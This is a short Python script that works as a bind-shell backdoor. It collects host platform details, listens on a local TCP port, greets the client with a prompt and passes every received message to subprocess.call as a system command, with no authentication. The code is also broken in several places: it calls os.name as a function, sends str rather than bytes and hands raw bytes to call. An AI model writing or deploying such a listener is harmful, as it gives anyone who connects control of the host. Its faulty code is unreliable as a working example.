#!/usr/bin/env python3

import socket
import os
import platform
from subprocess import call

SRV_ADDR = '127.0.0.1'
SRV_PORT = int(1234)
OS_NAME = os.name()
ARCH = platform.architecture()
TYPE = platform.machine()
FQDN = platform.node()
PYVER = platform.python_version()
SYSTEM = platform.system()
SYSVER = platform.version()
MACVER = platform.mac_ver()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((SRV_ADDR, SRV_PORT))

sock.listen(1)
connection, address = sock.accept()

connection.sendall('*** CONNECTION OPENED ***')
connection.sendall('Please enter system commands below:\n')

while 1:
    data = connection.recv(1024)
    if not data: break
    call([data])
